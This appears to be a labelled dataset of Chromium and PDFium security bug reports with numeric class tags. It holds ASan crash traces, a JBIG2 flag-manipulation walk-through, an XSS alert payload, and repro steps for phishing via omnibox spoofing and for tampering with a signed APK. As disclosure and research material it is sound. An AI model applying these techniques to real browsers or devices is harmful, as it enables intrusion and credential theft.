chromium 49.0.2566.0 release build compiled today	5
security universal xss using plugin objects vulnerability details this is a regression from issue 524120 now that widget updates are deferred until after the frame is detached from the document and beyond the lifetime of scriptforbiddenscope too it is possible to attach another document to the frame before a new document is installed the attached document can then be used to bypass the same-origin policy version chrome 47.0.2526.27 beta chrome 48.0.2540.0 dev chromium 48.0.2544.0 pepper flash 19.0.0.207 release build compiled today	5
heap-buffer-overflow in convolve4rowshorizontally_sse2 vulnerability details the attached testcase crashes filter_fuzz_stub 32 and 64-bit build asan output on 32-bit below 64-bit attached 0524/111558 info filter_fuzz_stub.cc 60 test case repro.fil 0524/111558 info filter_fuzz_stub.cc 37 valid stream detected 17502==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 4 at thread t0 0 in convolve4rowshorizontally_sse2 unsigned char const skconvolutionfilter1d const unsigned char mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/opts/skbitmapfilter_opts_sse2.cpp:278 1 in bgraconvolve2d unsigned char const int bool skconvolutionfilter1d const skconvolutionfilter1d const int unsigned char skconvolutionprocs const bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skconvolver.cpp:439 2 in skbitmapscaler resize skbitmap skbitmap const skbitmapscaler resizemethod float float skbitmap allocator mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapscaler.cpp:302 3 in skbitmapprocstate processhqrequest mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapprocstate.cpp:152 4 in skbitmapprocstate chooseprocs skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapprocstate.cpp:273 5 in skbitmapprocshader oncreatecontext skshader contextrec const void const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapprocshader.cpp:101 6 in skshader createcontext skshader contextrec const void const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skshader.cpp:92 7 in skblitter choose skbitmap const skmatrix const skpaint const sksmallallocator 3u 1024u bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skblitter.cpp:927 8 in skautoblitterchoose skautoblitterchoose skbitmap const skmatrix const skpaint const bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skdraw.cpp:49 9 in skdraw drawrect skrect const skpaint const skmatrix const skrect const const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skdraw.cpp:859 10 in skdraw drawrect skrect const skpaint const const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/include/core/skdraw.h:40 11 in skdraw drawbitmap skbitmap const skmatrix const skrect const skpaint const const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skdraw.cpp:1307 12 in skbitmapdevice drawbitmap skdraw const skbitmap const skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapdevice.cpp:226 13 in skcanvas internaldrawbitmap skbitmap const skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1204 14 in skcanvas ondrawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:2039 15 in skcanvas drawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1753 16 in skmatriximagefilter onfilterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skmatriximagefilter.cpp:86 17 in skimagefilter filterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:189 18 in skcanvas internaldrawdevice skbasedevice int int skpaint const bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1233 19 in skcanvas internalrestore mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1098 20 in autodrawlooper autodrawlooper mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:402 21 in skcanvas internaldrawbitmap skbitmap const skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1208 22 in skcanvas ondrawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:2039 23 in skcanvas drawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1753 24 in runtestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:47 25 in readandruntestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:66 26 in main mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:85 27 in libc_start_main is located 0 bytes to the right of 8-byte region allocated by thread t0 here 0 in interceptor_malloc 1 in sk_malloc_throw unsigned int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/ext/skmemory_new_handler.cpp:50 2 in sktarray unsigned char false checkrealloc int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/include/core/sktarray.h:453 3 in sktarray unsigned char false reset int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/include/core/sktarray.h:134 4 in anonymous namespace circularrowbuffer circularrowbuffer int int int mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skconvolver.cpp:40 5 in bgraconvolve2d unsigned char const int bool skconvolutionfilter1d const skconvolutionfilter1d const int unsigned char skconvolutionprocs const bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skconvolver.cpp:396 6 in skbitmapscaler resize skbitmap skbitmap const skbitmapscaler resizemethod float float skbitmap allocator mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapscaler.cpp:302 7 in skbitmapprocstate processhqrequest mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapprocstate.cpp:152 8 in skbitmapprocstate chooseprocs skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapprocstate.cpp:273 9 in skbitmapprocshader oncreatecontext skshader contextrec const void const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapprocshader.cpp:101 10 in skshader createcontext skshader contextrec const void const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skshader.cpp:92 11 in skblitter choose skbitmap const skmatrix const skpaint const sksmallallocator 3u 1024u bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skblitter.cpp:927 12 in skautoblitterchoose skautoblitterchoose skbitmap const skmatrix const skpaint const bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skdraw.cpp:49 13 in skdraw drawrect skrect const skpaint const skmatrix const skrect const const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skdraw.cpp:859 14 in skdraw drawrect skrect const skpaint const const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/include/core/skdraw.h:40 15 in skdraw drawbitmap skbitmap const skmatrix const skrect const skpaint const const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skdraw.cpp:1307 16 in skbitmapdevice drawbitmap skdraw const skbitmap const skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapdevice.cpp:226 17 in skcanvas internaldrawbitmap skbitmap const skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1204 18 in skcanvas ondrawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:2039 19 in skcanvas drawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1753 20 in skmatriximagefilter onfilterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skmatriximagefilter.cpp:86 21 in skimagefilter filterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:189 22 in skcanvas internaldrawdevice skbasedevice int int skpaint const bool mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1233 23 in skcanvas internalrestore mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1098 24 in autodrawlooper autodrawlooper mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:402 25 in skcanvas internaldrawbitmap skbitmap const skmatrix const skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1208 26 in skcanvas ondrawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:2039 27 in skcanvas drawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1753 28 in runtestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:47 29 in readandruntestcase mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:66 summary addresssanitizer heap-buffer-overflow home/nils/monkeychrome/asan-symbolized-v8-arm-linux-release-330758/filter_fuzz_stub shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa fa fa fa fa 00 fa fa fa 00 fa fa fa fa fa fa fa 00 fa fa fa 00 fa fa fa fa fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 17502==aborting version chrome version asan-symbolized-linux-release-331246 reproduction case attached as repro.fil	11
bad-cast to util from document js_define.h:165:13 detailed report fuzzer attekett_surku_fuzzer job type linux_cfi_chrome platform id linux crash type bad-cast crash address crash state bad-cast to util from document js_define.h:165:13 minimized testcase 15.39 kb filer aarya see for more information	7
heap-buffer-overflow in opj_dwt_decode useragent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/41.0.2272.35 safari/537.36 steps to reproduce the problem 1 run attached pdf through pdfium_test compiled with asan 2 will crash and show invalid memory read access full asan debugging output attached what is the expected behavior what went wrong should n't access invalid memory did this work before n/a chrome version 41.0.2272.35 channel n/a os version flash version	7
security blink weekinputtype uaf vulnerability vulnerability details a blink weekinputtype object is freed in a event handler but be used again after the handler a simple analysis and poc file is in the attachment version chrome version 46.0.2490.71 stable operating system win7 with full pack crash fb0.1ee0 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=4f416850 ebx=00000000 ecx=4f48c8d0 edx=62e05cb4 esi=40690000 edi=4f48c8d0 eip=61005f6a esp=0028df00 ebp=0028df78 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_child blink element useragentshadowroot 61005f6a 8bb688000000 mov esi dword ptr esi+88h ds:0023:40690088 0:000 dd edi 4f48c8d0 e0ca484f 30404030 30404000 3042c3f4 4f48c8e0 00000000 00000000 00000000 00000000 4f48c8f0 00000000 00000000 00000000 00000001 4f48c900 00000004 30404030 30404000 30438078 4f48c910 00000000 00000000 00000000 00000000 4f48c920 00000000 00000000 00000000 00000001 4f48c930 00000005 30404030 30404000 304bc000 4f48c940 00000000 00000000 00000000 00000000 0:000 kvn l20 childebp retaddr args to child 00 inline chrome_child blink element useragentshadowroot inline function 61005f6a conv thiscall 01 inline chrome_child blink basemultiplefieldsdateandtimeinputtype clearbuttonelement inline function 61005f6a conv thiscall 02 0028df78 61005d08 62e05e40 3047c000 0028e288 chrome_child blink basemultiplefieldsdateandtimeinputtype updateclearbuttonvisibility fpo non-fpo conv thiscall 03 0028e1c0 60bf5849 62e05e40 3047c000 0028e288 chrome_child blink basemultiplefieldsdateandtimeinputtype updateview fpo non-fpo conv thiscall 04 0028e1e0 60a3f134 62e05e40 0028e288 0028e288 chrome_child blink htmlinputelement parseattribute fpo non-fpo conv thiscall 05 0028e210 60a821fd 62e05e40 0028e288 00000000 chrome_child blink element attributechanged fpo non-fpo conv thiscall 06 0028e230 60a81cce 62e05e40 0028e288 0028e2ec chrome_child blink element didaddattribute fpo non-fpo conv thiscall 07 inline chrome_child blink element appendattributeinternal inline function 60a81cce conv thiscall 08 inline chrome_child blink element setattributeinternal inline function 60a81cce conv thiscall 09 0028e268 612d87af 62e05e40 0028e288 00000000 chrome_child blink element setattribute fpo non-fpo conv thiscall 0a 0028e28c 612d8826 0028e3a4 0866a3f8 0028e2d0 chrome_child blink htmlinputelementv8internal minattributesetter fpo non-fpo conv cdecl 0b 0028e29c 609e3628 0028e2b4 0028e39c 0028e39c chrome_child blink htmlinputelementv8internal minattributesettercallback fpo non-fpo conv cdecl 0c 0028e2d0 609e33cb 0028e348 612d87e8 0028e474 chrome_child v8 internal functioncallbackarguments call fpo non-fpo conv thiscall 0d 0028e364 60a457bf 0028e394 0866a3f8 0028e848 chrome_child v8 internal handleapicallhelper 0 fpo non-fpo conv cdecl 0e 0028e42c 609a8b6b 087e22d4 0028e848 0028e4e0 chrome_child v8 internal builtins invokeapifunction fpo non-fpo conv cdecl	11
heap-buffer-overflow in cjbig2_context parsesymboldict vulnerability details both bugs are executed via multiple dictionaries feeded to cjbig2_context parsesymboldict via a crafted jbig2 image heap-buffer-overflow m_pstream readshortinteger wflags psymboldictdecoder sdtemplate wflags 10 setting true on the first dictionary but false on the second lower if wflags plrseg plrseg m_result.sd m_bcontextretained setting flag true for second run if psymboldictdecoder sdhuff 0 dwtemp psymboldictdecoder sdtemplate 0 65536 psymboldictdecoder sdtemplate 1 8192 1024 gbcontext jbig2arithctx m_pmodule jbig2_malloc2 sizeof jbig2arithctx dwtemp jbig2_memcpy gbcontext plrseg m_result.sd m_gbcontext sizeof jbig2arithctx dwtemp else if psymboldictdecoder sdhuff 0 dwtemp psymboldictdecoder sdtemplate 0 65536 psymboldictdecoder sdtemplate 1 8192 1024 gbcontext jbig2arithctx m_pmodule jbig2_malloc2 sizeof jbig2arithctx dwtemp jbig2_memset gbcontext 0 sizeof jbig2arithctx dwtemp uninitialized memory write m_pstream readshortinteger wflags psymboldictdecoder sdhuff wflags setting sdhuff true on second run to prevent first heap-buffer-overflow psymboldictdecoder sdrefagg wflags 1 setting sdrefagg true on second run psymboldictdecoder sdtemplate wflags 10 psymboldictdecoder sdrtemplate wflags 12 lower if wflags plrseg plrseg m_result.sd m_bcontextretained setting flag true for second run if psymboldictdecoder sdhuff 0 dwtemp psymboldictdecoder sdtemplate 0 65536 psymboldictdecoder sdtemplate 1 8192 1024 gbcontext jbig2arithctx m_pmodule jbig2_malloc2 sizeof jbig2arithctx dwtemp jbig2_memcpy gbcontext plrseg m_result.sd m_gbcontext sizeof jbig2arithctx dwtemp if psymboldictdecoder sdrefagg 1 dwtemp psymboldictdecoder sdrtemplate 1 10 1 13 grcontext jbig2arithctx m_pmodule jbig2_malloc2 sizeof jbig2arithctx dwtemp jbig2_memcpy grcontext plrseg m_result.sd m_grcontext sizeof jbig2arithctx dwtemp else if psymboldictdecoder sdhuff 0 dwtemp psymboldictdecoder sdtemplate 0 65536 psymboldictdecoder sdtemplate 1 8192 1024 gbcontext jbig2arithctx m_pmodule jbig2_malloc2 sizeof jbig2arithctx dwtemp jbig2_memset gbcontext 0 sizeof jbig2arithctx dwtemp if psymboldictdecoder sdrefagg 1 dwtemp psymboldictdecoder sdrtemplate 1 10 1 13 grcontext jbig2arithctx m_pmodule jbig2_malloc2 sizeof jbig2arithctx dwtemp jbig2_memset grcontext 0 sizeof jbig2arithctx dwtemp lower if wflags setting flag true for first run psegment m_result.sd m_bcontextretained true if psymboldictdecoder sdhuff 0 psegment m_result.sd m_gbcontext gbcontext if psymboldictdecoder sdrefagg 1 psegment m_result.sd m_grcontext grcontext bused true else bused false 28633==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 524288 at thread t0 0 in asan_memcpy home/skomski/code/llvm-related/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:421 1 in cjbig2_context parsesymboldict cjbig2_segment ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:768:13 2 in cjbig2_context processiveparsesegmentdata cjbig2_segment ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:501:20 3 in cjbig2_context parsesegmentdata cjbig2_segment ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:491:19 4 in cjbig2_context decode_squentialorgnazation ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:143 5 in cjbig2_context continue ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:257:24 6 in cjbig2_context getfirstpage unsigned char int int int ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:244:15 7 in ccodec_jbig2module decode unsigned int unsigned int unsigned char const unsigned int unsigned char const unsigned int unsigned char unsigned int home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/codec/fx_codec_jbig.cpp:38:15 8 in main home/skomski/code/pdf_fuzzer/out/release samples/decoder_main_fuzzer.cc:27:3 9 in libc_start_main usr/lib/libc.so.6 10 in start home/skomski/code/pdf_fuzzer/out/release/pdfium_decoder_main_fuzzer is located 0 bytes to the right of 8192-byte region allocated by thread t0 here 0 in interceptor_calloc home/skomski/code/llvm-related/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:56 1 in fx_allocordie unsigned long unsigned long home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/codec include/fxcodec fxcrt/fx_memory.h:37:24 2 in cpdf_jbig2interface jbig2_malloc2 unsigned int unsigned int home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/codec/codec_int.h:220 summary addresssanitizer heap-buffer-overflow home/skomski/code/llvm-related/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:421 30822==error addresssanitizer segv on unknown address pc bp sp t0 0 in memmove_ssse3_back usr/lib/libc.so.6 1 in asan_memcpy home/skomski/code/llvm-related/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:421 2 in cjbig2_context parsesymboldict cjbig2_segment ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:773:13 3 in cjbig2_context processiveparsesegmentdata cjbig2_segment ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:501:20 4 in cjbig2_context parsesegmentdata cjbig2_segment ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:491:19 5 in cjbig2_context decode_squentialorgnazation ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:143 6 in cjbig2_context continue ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:257:24 7 in cjbig2_context getfirstpage unsigned char int int int ifx_pause home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/jbig2/jbig2_context.cpp:244:15 8 in ccodec_jbig2module decode unsigned int unsigned int unsigned char const unsigned int unsigned char const unsigned int unsigned char unsigned int home/skomski/code/pdf_fuzzer/out/release core/src/fxcodec/codec/fx_codec_jbig.cpp:38:15 9 in main home/skomski/code/pdf_fuzzer/out/release samples/decoder_main_fuzzer.cc:27:3 10 in libc_start_main usr/lib/libc.so.6 11 in start home/skomski/code/pdf_fuzzer/out/release/pdfium_decoder_main_fuzzer addresssanitizer can not provide additional info summary addresssanitizer segv usr/lib/libc.so.6 in memmove_ssse3_back reproduction case attached a sample pdf	7
security linking to chrome urls inside pdf vulnerability details a hyperlink inside a pdf file shown by the chrome pdf-viewer can link to a chrome url and can be opened as a new tab as this is prohibited in html it will open about blank it also should n't be possible in a pdf-file version chrome version 44.0.2403.157 stable operating system kubuntu 14.04 reproduction case create a pdf file containing a hyperlink to a chrome url or download the attached file open the file inside chrome and open the link in a new tab or window	7
security heap-use-after-free in websitesettingsinfobardelegate create version chrome version 45.0.2407.0 canary 32 bits operating system windows 7 reproduction case watch the video 6472==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in websitesettingsinfobardelegate create c b\build\slave\win_asan_release\build\src\chrome\browser\ui\website_settings\website_settings_infobar_delegate.cc:20 1 in websitesettings onuiclosing c b\build\slave\win_asan_release\build\src\chrome\browser\ui\website_settings\website_settings.cc:372 2 in websitesettingspopupview onwidgetdestroying c b\build\slave\win_asan_release\build\src\chrome\browser\ui\views\website_settings\website_settings_popup_view cc:383 3 in views widget onnativewidgetdestroying c b\build\slave\win_asan_release\build\src\ui\views\widget\widget.cc:1108 4 in views desktopwindowtreehostwin handledestroying c b\build\slave\win_asan_release\build\src\ui\views\widget\desktop_aura\desktop_window_tree_host_win.cc:758 5 in views hwndmessagehandler ondestroy c b\build\slave\win_asan_release\build\src\ui\views\win\hwnd_message_handler.cc:1389 6 in views hwndmessagehandler processwindowmessage c b\build\slave\win_asan_release\build\src\ui\views\win\hwnd_message_handler.h:390 7 in views hwndmessagehandler onwndproc c b\build\slave\win_asan_release\build\src\ui\views\win\hwnd_message_handler.cc:896 8 in gfx windowimpl wndproc c b\build\slave\win_asan_release\build\src\ui\gfx\win\window_impl.cc:315 9 in isthreaddesktopcomposited c windows\system32\user32.dll 10 in isthreaddesktopcomposited c windows\system32\user32.dll 11 in inflaterect c windows\system32\user32.dll 12 in defwindowprocw c windows\system32\user32.dll 13 in kiusercallbackdispatcher c windows\system32\ntdll.dll 14 in base internal invoker indexsequence 0 base internal bindstate base internal runnableadapter void thiscall wrenchtoolbarbutton void void cdec l wrenchtoolbarbutton base internal typelist base weakptr wrenchtoolbarbutton base internal typelist base internal unwraptraits base weakptr wrenchtoolbarbutton base internal invokehelper 1 void base internal runnableadapter void thiscall wrenchtoolbarbutton void base internal typelist base weakptr wrenchtoolbarbutton const void cdecl void run c b\build\slave\win_asan_release\build\src\base\bind_internal.h:176 15 in base debug taskannotator runtask c b\build\slave\win_asan_release\build\src\base\callback.h:396 16 in base messageloop runtask c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:444 17 in base messageloop dowork c b\build\slave\win_asan_release\build\src\base\message_loop\message_loop.cc:454 addresssanitizer can not describe address in more detail wild memory access suspected summary addresssanitizer heap-use-after-free c b\build\slave\win_asan_release\build\src\chrome\browser\ui\website_settings\website_settings_infobar_delegate.cc:20 in websiteset tingsinfobardelegate create shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 6472==aborting 6472==addresssanitizer while reporting a bug found another one ignoring	11
integer-overflow in sfntly fontdata bound detailed report fuzzer miaubiz_svg_fuzzer job type linux_ubsan_chrome crash type integer-overflow crash address crash state sfntly fontdata bound sfntly readablefontdata readablefontdata sfntly writablefontdata writablefontdata regressed unminimized testcase additional requirements requires gestures filer ochang	7
security disrupting the omnibox from the attacker s website vulnerability details this vulnerability makes it possible to display arbitrary content under the url of the website that the user is trying to access from the attacker s page through the omnibox a variation of this vulnerability can be reproduced on firefox and ie when the user tries to leave the attacker s webpage using the location bar it s possible to redirect him to an arbitrary page however i could n't reproduce it on chrome version chrome version 45.0.2454.101 m stable i tested it too on 47.0.2520.0 canary and it works operating system windows 7 ultimate 32x service pack 1 reproduction case 1 access 2 type in the omnibox 3 a fake error page similar to google s should appear 4 a prompt should show up too asking for the user s credentials 5 after typing a random username and password you can check if it was stored in	9
security crazy linker on android allows modification of chrome apk without breaking signature vulnerability details chrome on android loads it s libraries using it s own fork of android crazy linker which parses chrome apk file itself bit differently than android does in particular when looking for end-of-central-directory-record signature pk\5\6 chrome s crazy linker starts searching at file size minus length of signature and android starts searching at file size minus size of eocdrecord this leads to chrome-specific variant of android master key bug version chrome version 45.0.2454.94 stable operating system android reproduction case unpack attached archive copy properly signed chrome apk as base.apk and run crazyzip.py to create output.apk 10mb attachment size limit does n't allow me attaching generated apk then install output.apk on android device with arm architecture it will replace currently installed chrome modified version will just run id sdcard/chrome-id.txt and exit note that this update will have access to files that normal chrome has such as cookies also note that installing this through on device installer will not work if there s already installed chrome with same or greater versioncode in that case modified apk can be installed through adb adb install r output.apk	7
security improperly escaped saved from url info allows modification of saved pages this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details whenever we save a webpage to our local storage the following bit of information is added to the source saved from url 0055 url the url parameter is not escaped an attacker could append to break the html comment and then insert malicious information or scripts version chrome version version 43.0.2357.124 m operating system windows 8 reproduction case 1 go to script alert whoops script 2 save the page 3 open the page	9
